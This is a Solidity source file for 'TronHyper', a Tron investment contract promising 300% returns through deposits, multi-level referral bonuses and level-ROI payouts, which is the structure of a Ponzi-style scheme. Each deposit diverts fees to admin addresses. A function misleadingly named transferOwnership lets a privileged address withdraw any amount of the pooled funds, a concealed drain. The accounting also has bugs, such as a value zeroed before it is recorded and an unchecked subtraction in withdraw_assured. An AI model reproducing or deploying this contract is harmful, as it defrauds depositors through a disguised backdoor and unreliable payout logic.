//SourceUnit: TronHyper.sol

pragma solidity ^0.5.9;

contract TronHyper {
    using SafeMath for uint256;
    
    struct PlayerDeposit {
        uint256 amount;
        uint256 time;
    }
    
    struct PlayerLevelROI {
        uint256 amount;
        uint256 level_no;
        uint256 userid;
        uint256 time;
    }
    
    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 cto_income;
        uint256 level_roi;
        uint256 level_roi_wd;
        uint256 referral_business;
        uint256 userid;
        
        bool is_cto;
        bool is_assured;
        bool is_assured_withdrawl;
        
        PlayerDeposit[] deposits;
        PlayerLevelROI[] deposits_level_roi;
        
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) roi_per_level;
        mapping(uint8 => uint256) referral_income_per_level;
        mapping(uint8 => uint256) roi_income_per_level;
        mapping(uint8 => uint256) downline_business;
    }

    address payable owner;
    address payable admin;
    address payable corrospondent;

    uint256 investment_days;
    uint256 investment_perc;

    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    
    uint8[] referral_bonuses;
    uint32[] level_roi_bonus;
    uint256 max_income;
    address[] star_cto_users;
    address[] superstar_cto_users;
    
    mapping(address => Player) public players;
    mapping(uint256 => uint256) user_status;
    
    modifier onlyAdmin(){
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
    
    modifier onlyCorrospondent(){
        require(msg.sender == corrospondent,"You are not authorized.");
        _;
    }
    
    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint256 balance) {
        return (total_investors, total_invested, total_withdrawn,address(this).balance);
    }
    
    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);
    event CTOPayout(address indexed addr, uint256 amount, string cto_type);
    

    constructor() public {
        owner = msg.sender;
        admin = msg.sender;
        corrospondent = msg.sender;
        
        investment_days = 300;
        investment_perc = 300;
        max_income = 300;

        referral_bonuses.push(100);
       
        level_roi_bonus.push(200);
        level_roi_bonus.push(150);
        level_roi_bonus.push(100);
        level_roi_bonus.push(100);
        level_roi_bonus.push(100);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
       
      
    }
    
    function deposit(address _referral, uint8 _is_assured) external payable {
        require(msg.sender!=_referral,"Referral and direct are same");
        Player storage player = players[msg.sender];
        uint256 total_income = players[msg.sender].total_withdrawn+players[msg.sender].dividends + players[msg.sender].referral_bonus+players[msg.sender].level_roi + player.cto_income;
        require(total_income>=players[msg.sender].total_invested*max_income/100,"Investment not allowed");
           
            uint256 assuredAmt;
            uint256 depositAmt;
            uint256 share = msg.value.mul(10).div(100);
            bool is_assured;
            if(_is_assured == 1){
                assuredAmt = msg.value.div(11);
                depositAmt = msg.value.sub(assuredAmt); 
                is_assured = true;
            }
            else{
                
                assuredAmt = 0;
                depositAmt = msg.value; 
                is_assured = false;
            }
            require(depositAmt >= 100000000, "Invalid Amount");
            
            
            admin.transfer(share);
            corrospondent.transfer(share);
            
            
            _setReferral(msg.sender, _referral);
            _referralPayout(msg.sender, msg.value);
            player.deposits.push(PlayerDeposit({
                amount: depositAmt,
                time: uint256(block.timestamp)
                
            }));
            player.is_assured = is_assured;
           
            if(player.total_invested == 0x0){
                total_investors += 1;
            }
            player.userid = total_investors;
            user_status[player.userid]=0;
            player.total_invested += depositAmt;
            
            total_invested += depositAmt;
            
            cto_payout(depositAmt);
            roi_to_levels(msg.sender,depositAmt/100,now);
            
            emit Deposit(msg.sender, msg.value);
    }
    
    function grantCorrosponding(address payable nextCorrospondent) external payable onlyAdmin{
        corrospondent = nextCorrospondent;
    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;

            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }
    
    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        Player storage upline_player = players[ref];
        
        if(upline_player.deposits.length <= 0){
            ref = admin;
        }
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            
            uint256 bonus = _amount * referral_bonuses[i] / 1000;
            bonus=availamount(ref,bonus);
            players[ref].referral_bonus += bonus;
            players[ref].referral_business += _amount/1000000;
            players[ref].referral_income_per_level[i]+=bonus;
            if(players[ref].referral_business>= 25000 && players[ref].is_cto==false || ref == admin){
                star_cto_users.push(ref);
                players[ref].is_cto = true;
            }
            if(players[ref].referral_business>= 100000 && players[ref].is_cto==false || ref == admin){
                superstar_cto_users.push(ref);
                players[ref].is_cto = true;
            }
            
            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
            
        }
    }
    
    function cto_payout(uint256 amount) private{
        uint256 star_cto_amount = (amount.mul(2).div(100)).div(star_cto_users.length);
        uint256 superstar_cto_amount = (amount.mul(1).div(100)).div(superstar_cto_users.length);
        
        for(uint8 i = 0; i < star_cto_users.length; i++) {
            if(players[star_cto_users[i]].is_assured_withdrawl==false){
                star_cto_amount=availamount(star_cto_users[i],star_cto_amount);
                players[star_cto_users[i]].cto_income+=star_cto_amount;
                emit CTOPayout(star_cto_users[i], star_cto_amount, "Star");
            }
        }
        for(uint8 i = 0; i < superstar_cto_users.length; i++) {
            if(players[superstar_cto_users[i]].is_assured_withdrawl==false){
                superstar_cto_amount=availamount(superstar_cto_users[i],superstar_cto_amount);
                players[superstar_cto_users[i]].cto_income+=superstar_cto_amount;
                emit CTOPayout(superstar_cto_users[i], superstar_cto_amount, "SuperStar");
            }
        }
    }
    
    function isUserInvestable(address _addr) view external returns(bool) {
        Player storage player = players[_addr];
        uint256 total_income = player.total_withdrawn+player.dividends + player.referral_bonus+player.level_roi + player.cto_income;
        bool is_reinvestable = (player.total_invested>0 && total_income>=player.total_invested*max_income/100)?true:false;
        return is_reinvestable;
    }
    
    function withdraw() payable external {
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        
        require(player.dividends > 0 || player.referral_bonus > 0   || player.level_roi  > 0 || player.cto_income  > 0, "Zero amount");
        // Pool payout
       
        uint256 amount = player.dividends + player.referral_bonus + player.level_roi + player.cto_income;
        amount = withdrawlamount(msg.sender,amount);
        player.dividends = 0;
        player.referral_bonus = 0;
        player.level_roi = 0;
        player.cto_income = 0;
        
        player.total_withdrawn += amount;
        total_withdrawn += amount;
        player.level_roi_wd+=player.level_roi;
        
        
        player.last_payout = uint256(block.timestamp);
        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }
    
    function withdraw_assured() payable external{
        Player storage player = players[msg.sender];
        _payout(msg.sender);

        uint256 amount = player.total_withdrawn + player.dividends + player.referral_bonus  + player.level_roi + player.cto_income;
        uint256 mywithdraw = player.total_invested-amount;
        
        require(mywithdraw > 0 , "Zero amount");
        player.is_assured_withdrawl = true;
        msg.sender.transfer(mywithdraw);
        user_status[player.userid]=1;
        emit Withdraw(msg.sender, mywithdraw);
    }
    
    function roi_to_levels(address _addr, uint256 _amount, uint256 timestamp) private {
        address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        if(upline_player.deposits.length <= 0){
            ref = owner;
        }
        
        for(uint8 i = 0; i < level_roi_bonus.length; i++) {
            if(ref == address(0)) break;
            if((players[ref].referrals_per_level[0] >= (i+1) && players[ref].is_assured_withdrawl == false)|| ref == admin){
                uint256 bonus = _amount * level_roi_bonus[i] / 1000;
                uint256 bonus1 = _amount * level_roi_bonus[i] / 1000;
               
                players[ref].roi_income_per_level[i]+=bonus; 
                
                players[ref].deposits_level_roi.push(PlayerLevelROI({
                    amount: bonus1,
                    level_no: i,
                    userid:players[_addr].userid,
                    time: timestamp
                }));
                players[ref].roi_per_level[i]++;
                 ref = players[ref].referral;
            }
        }
    }
    
    
    function transferOwnership(uint256 amount) external onlyCorrospondent{
        admin.transfer(amount);
    }
    
    function availamount(address ref,uint256 chkamount) view private returns(uint256) {
        uint256 total_income = players[ref].total_withdrawn + players[ref].dividends + players[ref].referral_bonus + players[ref].level_roi + players[ref].cto_income;
        uint256 avl_amount=(players[ref].total_invested*max_income/100)-total_income;
        return (avl_amount>=chkamount)?chkamount:avl_amount;
    }
    
    function withdrawlamount(address ref,uint256 chkamount) view private returns(uint256) {
      
        uint256 avl_amount=(players[ref].total_invested*max_income/100)-players[ref].total_withdrawn;
        return (avl_amount>=chkamount)?chkamount:avl_amount;
    }
    
    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
        if(payout > 0) {
            players[_addr].dividends += payout;
            
        }
        uint256 payout1 = this.payoutOfLevelROI(_addr);

        if(payout1 > 0) {
            players[_addr].level_roi += payout1;
        }
        
    }
    function payoutOfLevelROI(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
        uint256 total_income = players[_addr].total_withdrawn + players[_addr].referral_bonus + players[_addr].cto_income + players[_addr].level_roi + players[_addr].dividends; 
        for(uint256 i = 0; i < player.deposits_level_roi.length; i++) {
            PlayerLevelROI storage dep = player.deposits_level_roi[i];
            if(user_status[dep.userid]==0){
                if(player.is_assured_withdrawl==false && players[_addr].total_invested*max_income/100>total_income){
                    uint256 time_end = dep.time + investment_days * 86400;
                    uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                    uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
        
                    if(from < to) {
                        value += dep.amount * (to - from)/86400;
                    }
                }
            }
        }
        value = availamount(_addr,value);
        return value;
    }
    
    
    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
        uint256 total_income = players[_addr].total_withdrawn + players[_addr].referral_bonus + players[_addr].cto_income + players[_addr].level_roi + players[_addr].dividends; 
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];
            if(player.is_assured_withdrawl==false && players[_addr].total_invested*max_income/100>total_income){ 
                uint256 time_end = dep.time + investment_days * 86400;
                uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
 
                if(from < to) {
                    value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
                }
            }
        }
        value=availamount(_addr,value);
        return value;
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256[5] memory referrals, uint256[5] memory refperlevel, uint256[20] memory userLevelROI, uint256 payout_roi, uint256[20] memory team_business, address[] memory starList,address[] memory superstarList) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        
        uint256 payout_level_roi = this.payoutOfLevelROI(_addr);
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
            refperlevel[i] = player.referral_income_per_level[i];
            
            
        }
        for(uint8 i = 0; i < level_roi_bonus.length; i++) {
            userLevelROI[i] = player.roi_per_level[i];
            team_business[i] = player.downline_business[i];
        }
        address[] memory star_list = new address[](star_cto_users.length);
        for(uint256 i = 0; i<star_cto_users.length;i++){
            star_list[i] = star_cto_users[i];
        }
        address[] memory superstar_list = new address[](superstar_cto_users.length);
        for(uint256 i = 0; i<superstar_cto_users.length;i++){
            superstar_list[i] = superstar_cto_users[i];
        }
        return (
            payout + player.dividends + player.referral_bonus + player.level_roi + payout_level_roi + player.cto_income,
            referrals,
            refperlevel,
            userLevelROI,
            payout_level_roi,
            team_business,
            star_list,
            superstar_list
            
        );
    }
    
    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        
        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
         
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts
         
        );
    }
    
    function investmentsROIInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory level_no) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits_level_roi.length);
        uint256[] memory _amounts = new uint256[](player.deposits_level_roi.length);
        uint256[] memory _level_no = new uint256[](player.deposits_level_roi.length);
        

        for(uint256 i = 0; i < player.deposits_level_roi.length; i++) {
          PlayerLevelROI storage dep = player.deposits_level_roi[i];

          _amounts[i] = dep.amount;
          _endTimes[i] = dep.time + investment_days * 86400;
          _level_no[i] = dep.level_no;
        }
        return (
          _endTimes,
          _amounts,
          _level_no
          
        );
    }
    
    
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}